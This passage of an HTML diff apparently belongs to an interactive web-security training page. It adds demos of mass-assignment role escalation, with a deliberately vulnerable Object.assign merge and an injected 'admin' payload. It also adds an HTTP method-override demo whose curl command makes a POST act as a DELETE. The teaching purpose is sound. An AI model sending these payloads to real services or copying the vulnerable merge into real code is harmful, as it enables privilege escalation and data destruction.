+  <textarea id="mass-input" rows="3">{"name":"Alice","email":"alice@example.com"}</textarea>
+  <button onclick="massAssign()">Update Profile</button>
+  <div class="output" id="mass-out"></div>
+  <div class="cmd">// Inject role escalation:
+document.getElementById('mass-input').value = JSON.stringify({
+  "name":"Alice","email":"alice@example.com","role":"admin","isVerified":true,"balance":999999
+});
+massAssign();</div>
+  <script>
+    var userObj = {name:'Alice', email:'alice@example.com', role:'user', isVerified:false, balance:0};
+    function massAssign(){
+      try{
+        var payload = JSON.parse(document.getElementById('mass-input').value);
+        Object.assign(userObj, payload); // vulnerable merge
+        document.getElementById('mass-out').textContent = 'Updated user: ' + JSON.stringify(userObj);
+      }catch(e){ document.getElementById('mass-out').textContent='Invalid JSON'; }
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 26. HTTP Method Override ═══════════ -->
+<div class="section" id="http-method">
+  <h2>26. HTTP Method Override <span class="badge">Access Control</span></h2>
+  <p class="hint">Some servers honour <code>X-HTTP-Method-Override</code> headers, allowing POST to masquerade as DELETE/PUT.</p>
+  <label>Method:</label>
+  <select id="http-method-select">
+    <option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option>
+  </select>
+  <label>Override header value:</label>
+  <input id="method-override" value="DELETE">
+  <button onclick="methodSim()">Send Request</button>
+  <div class="output" id="method-out"></div>
+  <div class="cmd">// curl equivalent:
+// curl -X POST https://api.example.com/users/1 \\
+//   -H "X-HTTP-Method-Override: DELETE"
+// Server processes as DELETE — deletes user without firewall noticing POST.</div>
+  <script>
+    function methodSim(){
+      var m = document.getElementById('http-method-select').value;
+      var ov = document.getElementById('method-override').value;
+      document.getElementById('method-out').textContent =
+        'Sent: ' + m + ' with X-HTTP-Method-Override: ' + ov +
+        '\nServer interpreted as: ' + ov +
+        (ov==='DELETE'?' → 🗑️ Resource deleted!': ov==='PUT'?' → ✏️ Resource overwritten!': '');
+    }
+  </script>
+</div>
+
+</body>
+</html>
